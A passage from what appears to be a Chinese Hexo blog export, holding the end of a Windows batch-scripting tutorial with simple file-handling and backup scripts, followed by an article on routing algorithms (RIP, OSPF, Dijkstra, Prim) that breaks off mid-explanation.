class="built_in">del</span> temp.txt</span><br></pre></td></tr></table></figure><p> 输出结果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">i=11 , j=13 ,k=14 15 16</span><br><span class="line">i=21 , j=23 ,k=24,25,26</span><br><span class="line">i=31 , j=33 ,k=34-35-36</span><br></pre></td></tr></table></figure><p> 程序关键代码简单说明：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">skip=<span class="number">4</span><span class="comment">#跳过temp.txt文件的前4行。</span></span><br><span class="line">eol=; <span class="comment">#忽略冒号打头的行，直接跳过不处理</span></span><br><span class="line">delims=,- <span class="comment">#指定分隔符为逗号（,）、减号(-)、和空格,空格必须放在最后</span></span><br><span class="line">tokens=<span class="number">1</span>,<span class="number">3</span>*<span class="comment">#将按照指定分隔符号分隔到的第1个字段赋给变量i,第二个字段赋值给变量j，剩余字段赋值给变量k。注意：变量i在 for 语句中显式声明，变量j和变量k是通过tokens= 选项隐式声明的。</span></span><br></pre></td></tr></table></figure><p> 建议：如果还是不太理解的可以将上述skip、eol、delims、tokens进行修改并执行观察输出，</p><h1 id="bat脚本常用实例"><a href="#bat脚本常用实例" class="headerlink" title="bat脚本常用实例"></a>bat脚本常用实例</h1><h3 id="根据输入选项操作"><a href="#根据输入选项操作" class="headerlink" title="根据输入选项操作"></a>根据输入选项操作</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> /p var=<span class="string">&quot;Please input the number(1,2,3):&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> %var% == <span class="number">1</span> (</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;the number equal to 1&quot;</span></span><br><span class="line">) <span class="keyword">else</span> <span class="keyword">if</span> %var% == <span class="number">2</span> (</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;the number equal to 2&quot;</span></span><br><span class="line">) <span class="keyword">else</span> <span class="keyword">if</span> %var% == <span class="number">3</span> (</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;the number equal to 3&quot;</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;input wrong number,exit program.&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h3 id="文件和目录相关操作"><a href="#文件和目录相关操作" class="headerlink" title="文件和目录相关操作"></a>文件和目录相关操作</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">rem <span class="string">&quot;About operate directory&amp;file bat script&quot;</span></span><br><span class="line"></span><br><span class="line">title Test bat</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> CURRENTDIR=D:\worktset TEMPDIR=%CURRENTDIR%\temp</span><br><span class="line"><span class="built_in">set</span> TEMPFILE=%TEMPDIR%\temp.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> not exist %TEMPDIR% (</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Create temp directory&quot;</span></span><br><span class="line">  mkdir %TEMPDIR%</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">  <span class="built_in">echo</span> The directory of %TEMPDIR% existed,recreate directory</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> not exist %TEMPFILE% (</span><br><span class="line">  <span class="built_in">echo</span> Create temp file</span><br><span class="line">  <span class="built_in">type</span> nul &gt; %TEMPFILE%</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">  <span class="built_in">echo</span> </span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;=========%DATE% %TIME%================&quot;</span> &gt;&gt; %TEMPFILE%</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Happy New Year! &gt;&gt; %TEMPFILE%</span><br><span class="line"><span class="built_in">echo</span> Congratulate to everyone &gt;&gt; %TEMPFILE%</span><br><span class="line"></span><br><span class="line">rem <span class="built_in">copy</span> file and directory</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> TEMPDIR2=%CURRENTDIR%\temp2</span><br><span class="line"></span><br><span class="line"><span class="built_in">md</span> %TEMPDIR2%</span><br><span class="line">xcopy /s /y %TEMPDIR% %TEMPDIR2%</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> %TEMPDIR2%\temp.txt</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h3 id="将指定目录下的文件输出并移动到指定目录下"><a href="#将指定目录下的文件输出并移动到指定目录下" class="headerlink" title="将指定目录下的文件输出并移动到指定目录下"></a>将指定目录下的文件输出并移动到指定目录下</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">rem 如果路径中包含空格，变量值需带双引号rem WORK_DIR表示要操作的文件夹，DEST_DIR表示文件要保存的目标文件夹</span><br><span class="line"><span class="built_in">SET</span> WORK_DIR=<span class="string">&quot;c:\Program Files&quot;</span></span><br><span class="line"><span class="built_in">SET</span> DEST_DIR=<span class="string">&quot;D:\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> not exist %DEST_DIR% (</span><br><span class="line">  mkdir %DEST_DIR%</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%i <span class="keyword">in</span> (<span class="string">&#x27;dir /b /s /o:n /a:a %WORK_DIR%&#x27;</span>) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> %%i</span><br><span class="line">  <span class="built_in">copy</span> <span class="string">&quot;%%i&quot;</span> %DEST_DIR%</span><br><span class="line">) </span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h3 id="将指定目录下的文件按照文件名排序输出。"><a href="#将指定目录下的文件按照文件名排序输出。" class="headerlink" title="将指定目录下的文件按照文件名排序输出。"></a>将指定目录下的文件按照文件名排序输出。</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">SET</span> WORK_DIR=D:\temp\work</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%i <span class="keyword">in</span> (<span class="string">&#x27;dir /a /b /on %WORK_DIR%\*.txt&#x27;</span>) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> %%i</span><br><span class="line">) </span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h3 id="hexo备份博客bat脚本"><a href="#hexo备份博客bat脚本" class="headerlink" title="hexo备份博客bat脚本"></a>hexo备份博客bat脚本</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> =========日期时间按照YYYYMMDD_HHMMSS格式显示=============  </span><br><span class="line"><span class="built_in">set</span> CURRENT_DATE_TIME_STAMP=<span class="variable">%date:~0,4%</span><span class="variable">%date:~5,2%</span><span class="variable">%date:~8,2%</span>_<span class="variable">%time:~0,2%</span><span class="variable">%time:~3,2%</span><span class="variable">%time:~6,2%</span>  </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%CURRENT_DATE_TIME_STAMP%</span>  </span><br><span class="line">@<span class="built_in">echo</span> =========================================================  </span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 去掉所有空格空格</span><br><span class="line">:: Code by JM <span class="number">2006</span>-<span class="number">11</span>-<span class="number">28</span> <span class="built_in">CMD</span>@XP</span><br><span class="line">:: 出处：http://www.cn-dos.<span class="built_in">net</span>/forum/viewthread.php?tid=<span class="number">25172</span></span><br><span class="line"><span class="built_in">set</span> &quot;CURRENT_DATE_TIME_STAMP=%CURRENT_DATE_TIME_STAMP: =%&quot;</span><br><span class="line"><span class="built_in">echo</span> &quot;☆<span class="variable">%CURRENT_DATE_TIME_STAMP%</span>☆<span class="built_in">Start</span> <span class="built_in">copy</span>~~~&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tar -zcvf F:\BackupFile\myblog_backup.tar.gz F:\Haoran\桌面\myblog\*</span><br><span class="line">qshell fput hexobackup myblog/myblog_<span class="variable">%CURRENT_DATE_TIME_STAMP%</span>.tar.gz F:\BackupFile\myblog_backup.tar.gz</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> =========备份完成=============  </span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h3 id="DOS命令下如何实现自动交互？"><a href="#DOS命令下如何实现自动交互？" class="headerlink" title="DOS命令下如何实现自动交互？"></a>DOS命令下如何实现自动交互？</h3><p>  利用重定向方式可以实现自动交互输入。假设需要交互的脚本为A.exe，脚本需要依次输入12、13、15。则可以采用如下形式：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> c.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="number">12</span> &gt; c.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="number">13</span> &gt;&gt; c.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="number">15</span> &gt;&gt; c.txt</span><br><span class="line">A.exe &lt; c.txt</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>转载: <a href="https://www.cnblogs.com/linyfeng/p/8072002.html">bat脚本基础教程 </a></li><li><a href="http://www.jb51.net/article/107286.htm">cmd详解 目录类命令</a></li><li><a href="http://wxphp.com/wxd_6bpii99ord371qy5cni9_1.html">cmd下文件类操作命令</a></li><li><a href="https://www.itdaan.com/blog/2017/06/05/2d3ebe57ee1a.html#:~:text=1%E3%80%81Windows%E4%B8%8Bbat%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96%E6%97%B6%E9%97%B4%201%20%3A%3A%20%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA%E6%97%B6%E6%9C%80%E5%A5%BD%E9%80%89%E6%8B%A9GB2312%E7%BC%96%E7%A0%81%20%28%E6%96%B9%E5%BC%8F%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E6%96%B0%E5%BB%BAtxt%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BE%93%E5%85%A5%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E4%BF%9D%E5%AD%98%E5%90%8E%E5%B0%86%E5%90%8E%E7%BC%80.txt%E6%94%B9%E6%88%90.bat%29%202%20%3A%3A%20%40echo,ORIGINAL_DATE%3D%25date%25%207%20echo%20%25ORIGINAL_DATE%25%208%20%40echo%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%E6%97%A5%E6%9C%9F%E6%8C%89%E7%85%A7YYYY-MM-DD%E6%A0%BC%E5%BC%8F%E6%98%BE%E7%A4%BA%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE">Windows下bat脚本获取时间和Linux下shell命令获取时间</a></li><li><a href="https://blog.csdn.net/yaoyaoxingkong/article/details/8480948">bat去掉字符串前后空格</a></li><li><a href="https://blog.csdn.net/u010073893/article/details/52469709">批处理基本语法整理（一）_正在崛起的小菜菜的博客-CSDN博客_批处理语法</a></li><li><a href="https://blog.csdn.net/qq_36838191/article/details/83046599">Windows 批处理(bat)语法大全_MakeGreatEffort的博客-CSDN博客_bat语法</a></li><li><a href="https://blog.csdn.net/zhao923822745/article/details/78731399">BAT文件语法和技巧(bat文件的编写及使用)_火苗战神的博客-CSDN博客</a></li><li><a href="https://www.bilibili.com/video/BV1Yv411j7ru/?spm_id_from=333.788.recommend_more_video.0&vd_source=e73a152dada4626bad49c30d848902f7">第五十九课 - BAT脚本教学概括_哔哩哔哩_bilibili</a></li><li><a href="https://www.bilibili.com/video/BV1wU4y1t7WN/?from=search&seid=16036784492378723775">第六十课 - BAT脚本教学语法讲解括_哔哩哔哩_bilibili</a></li><li><a href="https://www.bilibili.com/video/BV1Qv411q7bN/?spm_id_from=333.788.recommend_more_video.0&vd_source=e73a152dada4626bad49c30d848902f7">【黑客基础】2020年最新Windows DOS命令\批处理脚本学习_哔哩哔哩_bilibili</a></li><li>[解决bat批处理输出乱码的问题 - html中文网](<a href="https://www.html.cn/script/26165.html#:~:text=%E5%A6%82%E6%9E%9C%E4%BD%A0%E7%9A%84bat%E6%96%87%E4%BB%B6%E6%98%AFUTF-8%E7%BC%96%E7%A0%81%E7%9A%84%2C">https://www.html.cn/script/26165.html#:~:text=如果你的bat文件是UTF-8编码的%2C</a> 或者是是其他Codepage下创建的%2C 比如 Windows日语版下创建的bat文件%2C,保存为ANSI编码时对应cp932%2C 即Shift-JIS编码 Windows繁体中文版下创建的bat文件%2C 保存为ANSI编码时对应cp950%2C 即Big5编码)</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 脚本编写 </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由算法</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E7%AE%97%E6%B3%95.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E7%AE%97%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="路由算法综述"><a href="#路由算法综述" class="headerlink" title="路由算法综述"></a><strong>路由算法综述</strong></h1><p>路由器转发分组是通过路由表转发的，而路由表是通过各种算法得到的。主机通常直接与一台路由器相连接，该路由器即为该主机的默认路由器(default router) ，又称该主机的第一跳路由器(first-hop router)每当主机发送一个分组时，该分组被传送给它的默认路由器。源主机的默认路由器称作源路由器(source router) ,目的主机的默认路由器称作目的路由器(destination router)。 一个分组从源主机到目的主机的路由选择问题显然可归结为从源路由器到目的路由器的路由选择问题。</p><blockquote><p>【路由选择算法的分类】</p><ul><li>1)静态路由算法（又称非自适应路由算法）</li><li>2)动态路由算法（又称自适应路由算法）</li></ul><blockquote><p> 从掌握网络拓扑信息的规模来看常用的动态路由算法可分为两类：</p><ul><li>距离－向量路由算法（分散路由选择算法）</li><li>链路状态路由算法（全局路由选择算法）</li></ul></blockquote></blockquote><h1 id="静态路由算法"><a href="#静态路由算法" class="headerlink" title="静态路由算法"></a><strong>静态路由算法</strong></h1><ul><li>由<strong>网络管理员手工配置路由信息</strong>。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。大型和复杂的网络环境通常不宜采用静态路由。</li></ul><blockquote><p>理由：</p><ul><li>网络管理员难以全面了解整个网络的拓扑结构</li><li>当网络的拓扑结构和链路状态发生变化时，路由器中的静态路由信息需要大范围地调整，这一工作的难度和复杂程度非常高</li><li>路由信息更新慢</li></ul></blockquote><ul><li>静态路由算法的优点是简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，因此仍广泛用于高度安全的军事系统和较小的商业网络。且优先级高</li></ul><h1 id="动态路由算法"><a href="#动态路由算法" class="headerlink" title="动态路由算法"></a>动态路由算法</h1><p>动态路由算法能改善网络的性能并有助于流量控制；但算法复杂，会增加网络的负担，有时因对动态变化的反应太快而引起振荡，或反应太慢而影响网络路由的一致性，因此要仔细设计动态路由算法，以发挥其优势。</p><blockquote><p>特点：</p><ul><li>路由更新快</li><li>定期更新（周期性）</li></ul></blockquote><h2 id="距离-向量路由算法-RIP-分散路由选择算法"><a href="#距离-向量路由算法-RIP-分散路由选择算法" class="headerlink" title="距离-向量路由算法(RIP)-分散路由选择算法"></a><strong>距离-向量路由算法(RIP)</strong>-分散路由选择算法</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><blockquote><p>路由信息协议RIP（Routing Information Protocol）采用距离-向量算法，利用跳数来作为计量标准，在实际使用中已经较少适用。距离向量路由算法，是基于Bellman-Ford方程，也就是动态规划算法实现的。</p><p>在距离向量路由算法中，同样是计算由u到其他任意一点。但在这种算法中，u无需知道整个网络的拓扑结构。<strong>对u来说，最重要的事情是知道，如果需要把数据运往z，最合适的邻居节点究竟是哪一个</strong>。</p><p><strong>即节点只需获取最短路径的下一跳，无需知道整个网络拓扑的情况，并且该信息用于转发表中</strong>。</p></blockquote><h3 id="宏观："><a href="#宏观：" class="headerlink" title="宏观："></a>宏观：</h3><blockquote><p>在默认情况下，RIP使用一种非常简单的度量制度：距离就是通往目的站点所需经过的链路数，取值为0~16，数值16表示路径无限长。RIP进程使用UDP的520端口来发送和接收RIP分组。RIP分组每隔30s以广播的形式发送一次，为了防止出现“广播风暴”，其后续的分组将做随机延时后发送。在RIP中，如果一个路由在180s内未被刷新，则相应的距离就被设定成无穷大，并从路由表中删除该表项。RIP分组分为两种：请求分组和响应分组。</p></blockquote><h3 id="发送方-请求分组-："><a href="#发送方-请求分组-：" class="headerlink" title="发送方(请求分组)："></a>发送方(请求分组)：</h3><blockquote><p>在距离-向量路由算法中，所有结点都定期地将它们的整个路由选择表传送给所有与之直接相邻的结点。这种路由选择表包含：</p><ol><li>每条路径的目的地（另一结点）。</li><li>路径的代价（也称距离）。</li></ol><p>【注意】：</p><p>这里的距离是一个抽象的概念，如RIP 就将距离定义为“跳数＂。跳数指从源端口到达目的端口所经过的路由个数，每经过一个路由器，跳数加1 。</p></blockquote><h3 id="接收方-响应分组-："><a href="#接收方-响应分组-：" class="headerlink" title="接收方(响应分组)："></a>接收方(响应分组)：</h3><p>在这种算法中，所有结点都必须参与距离向量交换，以保证路由的有效性和一致性，也就是说，所有的结点都监听从其他结点传来的路由选择更新信息，并在下列情况下立刻更新它们的路由选择表：</p><ol><li>被通告一条新的路由，该路由在本结点的路由表中不存在，此时本地系统加入这条新的路由。</li><li>发来的路由信息中有一条到达某个目的地的路由，该路由与当前使用的路由相比，有较短的距离（较小的代价）。此种情况下，就用经过发送路由信息的结点的新路由替换路由表中到达那个目的地的现有路由。</li></ol><blockquote><p>总结起来如下图：（DV即为距离向量）</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011631793.png" alt="img" style="zoom:33%;" /></blockquote><h3 id="距离向量路由算法的实质"><a href="#距离向量路由算法的实质" class="headerlink" title="距离向量路由算法的实质"></a>距离向量路由算法的实质</h3><blockquote><p>迭代计算一条路由中的站段数或延迟时间，从而得到到达一个 目标的最短（最小代价）通路。它要求每个结点在每次更新时都将它的全部路由表发送给所有相邻的结点。显然，更新报文的大小与通信子网的结点个数成正比，大的通信子网将导致很大的更新报文。由于更新报文发给直接邻接的结点，所以所有结点都将参加路由选择信息交换。基于这些原因，在通信子网上传送的路由选择信息的数量很容易变得非常大。</p><p>距离向量路由算法是一种<strong>迭代的、异步的、分布式</strong>的算法。</p><ul><li><p>迭代很好理解，在每个节点只需要知道他的下一跳的目的地的情况下，想要求得最小路径，那么必然需要使用迭代，使得最短路径不断趋近于真实值。为什么说是不断趋近于真实值呢？一开始，也就是初始化时，结点只知道他到其邻居结点的距离，而不知道到其他结点的距离。这就必然造成此结点到其直接邻居结点的距离并非是最优的，可能是绕过一个或两个结点再到此结点的情况，才是最短的路径。</p></li><li><p>所谓异步的，是因为我们不要求结点的步调整齐一致，也就是计算最短路径的时间可以是不同的。实际上，时间基本上就是不同。</p></li><li><p>所谓分布式的，是说每个节点都能接收到来自其邻居的信息，并执行计算，然后再将计算结果分发给邻居，邻居再将收到的数据进行计算，如果发现了其他最短路径，那么就会更新自身的信息，又进入了一个迭代的过程。</p><p>整个算法中最重要的是这样一个方程：</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011627203.png" alt="img" style="zoom:50%;" /></blockquote><h2 id="链路状态路由算法-OSPF-全局路由选择算法"><a href="#链路状态路由算法-OSPF-全局路由选择算法" class="headerlink" title="链路状态路由算法(OSPF)-全局路由选择算法"></a><strong>链路状态路由算法(OSPF)</strong>-全局路由选择算法</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在链路状态路由算法中，网络拓扑和所有的链路费用都是已知的。所有的结点或者说路由器都掌握着完整的网络拓扑和链路费用。</p><p>不论是链路状态路由算法还是距离向量选择算法，核心要义都是四个字：”<strong>最短路径</strong>“。并且知晓网络全貌，了解整个网络拓扑，那自然是会用到Prim和Dijkstra算法。</p><h3 id="它们执行下述两项任务"><a href="#它们执行下述两项任务" class="headerlink" title="它们执行下述两项任务:"></a>它们执行下述两项任务:</h3><ol><li>第一，主动测试所有邻接结点的状态。两个共享一条链接的结点是相邻结点，它们连接到同一条链路，或者连接到同一广播型物理网络。</li><li>第二，定期地将链路状态传播给所有其他结点。<code>典型的链路状态算法是OSPF算法。</code></li></ol><p>在一个链路状态路由选择中，一个结点检查所有直接链路的状态，并将所得的状态信息发送给网上的所有其他结点，而不是仅送给那些直接相连的结点。每个结点都用这种方式从网上所有其他的结点接收包含直接链路状态的路由选择信息。</p><p>每当链路状态报文到达时，路由结点便使用这些状态信息去更新自己的网络拓扑和状态“视野图”，一旦链路状态发生变化，结点就对更新的网络图利用Dijsktra最短路径算法重新计算路由，从单一的源出发计算到达**&#x3D;&#x3D;所有&#x3D;&#x3D;**目的结点的最短路径。</p><blockquote><p>【注意】</p><p>这是Dijsktra算法的一个实际应用</p></blockquote><h3 id="链路状态路由算法主要有三个特征："><a href="#链路状态路由算法主要有三个特征：" class="headerlink" title="链路状态路由算法主要有三个特征："></a>链路状态路由算法主要有三个特征：</h3><ol><li>向本自治系统中所有路由器发送信息，这里使用的方法是泛洪法，即路由器通过所有端口向所有相邻的路由器发送信息。而每个相邻路由器又将此信息发往其所有相邻路由器（但不再发送给刚刚发来信息的那个路由器）。</li></ol><blockquote><p>【洪泛法小知识】</p><p>洪泛法（Flooding）是一种简单的路由算法，将收到的封包，往所有的可能连结路径上递送，直到封包到达为止。洪泛法被使用在桥接器上，Usenet以及点对点档案分享等。部份的路由协定也以洪泛法为基础，例如开放式最短路径优先（OSPF）、距离向量群体广播路由协定(DistanceVectorMulticastRoutingProtocol，DVMRP)。无线随意网络也使用洪泛法来进行路由。</p></blockquote><ol start="2"><li><p>发送的信息是与路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。所谓“链路状态”，是指说明本路由器与哪些路由器相邻及该链路的“度量”。对于OSPF 算法，链路状态的＂度量”主要用来表示费用、距离、时延、带宽等。</p></li><li><p>只有当链路状态发生变化时，路由器才向所有路由器发送此消息。由于一个路由器的链路状态只涉及相邻路由器的连通状态，而与整个互联网的规模并无直接关系，因此链路状态路由算法可以用于大型的或路由信息变化聚敛的互联网环境。</p></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>每个路由结点都使用同样的原始状态数据独立地计算路径，而不依赖中间结点的计算；</li><li>链路状态报文不加改变地传播，因此采用该算法易于查找故障。当一个结点从所有其他结点接收到报文时，它可以在本地立即计算正确的通路，保证一步汇聚。</li><li>由于链路状态报文仅运载来自单个结点关于直接链路的信息，其大小与网络中的路径结点数目无关，因此链路状态算法比距离-向量算法有更好的规模可伸展性。</li></ul><h2 id="距离-向量路由算法与链路状态路由算法的比较："><a href="#距离-向量路由算法与链路状态路由算法的比较：" class="headerlink" title="距离-向量路由算法与链路状态路由算法的比较："></a>距离-向量路由算法与链路状态路由算法的比较：</h2><blockquote><p>在距离-向量路由算法中，每个结点仅与它 的直接邻居交谈，它为它的邻居提供从自已到网络中所有其他结点的最低费用估计。在链路状态 路由算法中，每个结点通过广播的方式与所有其他结点交谈，但它仅告诉它们与它直接相连的链 路的费用。相较之下，距离-向量路由算法有可能遇到路由环路等问题。</p><ul><li>【路由环路问题】：</li></ul><p>在维护路由表信息的时候，如果在拓扑发生改变后，网络收敛缓慢产生了不协调或者矛盾的路由选择条目，就会发生路由环路的问题，这种条件下，路由器对无法到达的网络路由不予理睬，导致用户的数据包不停在网络上循环发送，最终造成网络资源的严重浪费。</p><p> OSPF(Open Shortest Path First开放式最短路径优先）是对链路状态路由协议的一种实现，著名的迪克斯加算法被用来计算最短路径树。OSPF支持负载均衡和基于服务类型的选路，也支持多种路由形式，如特定主机路由和子网路由等。OSPF的简单说就是两个相邻的路由器通过发报文的形式成为邻居关系，邻居再相互发送链路状态信息形成邻接关系，之后各自根据最短路径算法算出路由，放在OSPF路由表，OSPF路由与其他路由比较后优的加入全局路由表。</p></blockquote><h1 id="层次路由"><a href="#层次路由" class="headerlink" title="层次路由"></a><strong>层次路由</strong></h1><p>当网络规模扩大时，路由器的路由表成比例地增大。这不仅会消耗越来越多的路由器缓冲区空间，而且需要用更多CPU 时间来扫描路由表，用更多的带宽来交换路由状态信息。因此路由选择必须按照层次的方式进行。</p><p>因特网将整个互联网划分为许多较小的自治系统（注意一个自治系统中包含很多局域网），每个自治系统有权自主地决定本系统内应采用何种路由选择协议。如果两个自治系统需要通信，那么就需要一种在两个自治系统之间的协议来屏蔽这些差异。据此，因特网把路由选择协议划分为两大类</p><ol><li>一个自治系统内部所使用的路由选择协议称为内部网关协议(IGP), 也称域内路由选择，具体的协议有RIP 和OSPF 等。</li><li>自治系统之间所使用的路由选择协议称为外部网关协议(EGP), 也称域间路由选择，用在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径。具体的协议有BGP 。</li></ol><h1 id="迪杰斯特拉算法（Dijkstra算法）"><a href="#迪杰斯特拉算法（Dijkstra算法）" class="headerlink" title="迪杰斯特拉算法（Dijkstra算法）"></a>迪杰斯特拉算法（Dijkstra算法）</h1><p>从一个例子开始</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011616799.png" alt="img" style="zoom:50%;" /><p>在上图中，我们以u为起点，计算u到z的最短路径。可见，若要计算u到z的路径，那么必须考虑全局信息。</p><p>实际上，迪杰斯特拉算法的核心内容是：找最小，然后找最小的邻居。</p><p>具体过程参考下图。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011617232.png" alt="img" style="zoom: 25%;" /><ol><li>初始化 ：与u相邻的置为权值，不与u相邻的置为无穷。 </li><li>找到最小 ：在上图中，与u相邻的权值最小的是（w，3），所以将w加入集合中。 </li><li>在其余中找最小 ：5为最小，则将x加入集合。经过x，可以到达z，这样最短，将z更新为14。 </li><li>接着找最小 ：6为最小，将v加入集合。经过uwv，可以到达y，最小值为10，则更新。 </li><li>依次类推，得到最终结果</li></ol><p>所以，我们能够得到最终的转发表。</p><table><thead><tr><th align="left">目的</th><th align="left">链路</th></tr></thead><tbody><tr><td align="left">v</td><td align="left">u-w-v</td></tr><tr><td align="left">x</td><td align="left">u-x</td></tr><tr><td align="left">y</td><td align="left">u-w-v-y</td></tr><tr><td align="left">w</td><td align="left">u-w</td></tr><tr><td align="left">z</td><td align="left">u-w-v-y-z</td></tr></tbody></table><h1 id="Prim算法——最小生成树"><a href="#Prim算法——最小生成树" class="headerlink" title="Prim算法——最小生成树"></a>Prim算法——最小生成树</h1><p>prim算法被用来求给定图的最小生成树</p><p>普里姆算法的实现思路是：</p><ol><li>将连通网中的所有顶点分为两类（假设为 A 类和 B 类）。初始状态下，所有顶点位于 B 类；</li><li>选择任意一个顶点，将其从 B 类移动到 A 类；</li><li>从 B 类的所有顶点出发，找出一条连接着 A 类中的某个顶点且权值最小的边，将此边连接着的 A 类中的顶点移动到 B 类；</li><li>重复执行第 3 步，直至 B 类中的所有顶点全部移动到 A 类，恰好可以找到 N-1 条边。</li></ol><p>举个例子，下图是一个连通网，使用普里姆算法查找最小生成树，需经历以下几个过程：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702115.gif" alt="img"><br>图 1 连通网<br>\1) 将图中的所有顶点分为 A 类和 B 类，初始状态下，A &#x3D; {}，B &#x3D; {A, B, C, D, S, T}。</p><p>\2) 从 B 类中任选一个顶点，假设选择 S 顶点，将其从 B 类移到 A 类，A &#x3D; {S}，B &#x3D; {A, B, C, D, T}。从 A 类的 S 顶点出发，到达 B 类中顶点的边有 2 个，分别是 S-A 和 S-C，其中 S-A 边的权值最小，所以选择 S-A 边组成最小生成树，将 A 顶点从 B 类移到 A 类，A &#x3D; {S, A}，B &#x3D; {B, C, D, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702093.gif" alt="img"><br>图 2 S-A 边组成最小生成树<br>\3) 从 A 类中的 S、A 顶点出发，到达 B 类中顶点的边有 3 个，分别是 S-C、A-C、A-B，其中 A-C 的权值最小，所以选择 A-C 组成最小生成树，将顶点 C 从 B 类移到 A 类，A &#x3D; {S, A, C}，B &#x3D; {B, D, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702109.gif" alt="img"><br>图 3 A-C 边组成最小生成树<br>\4) 从 A 类中的 S、A、C 顶点出发，到达 B 类顶点的边有 S-C、A-B、C-B、C-D，其中 C-D 边的权值最小，所以选择 C-D 组成最小生成树，将顶点 D 从 B 类移到 A 类，A &#x3D; {S, A, C, D}，B &#x3D; {B, 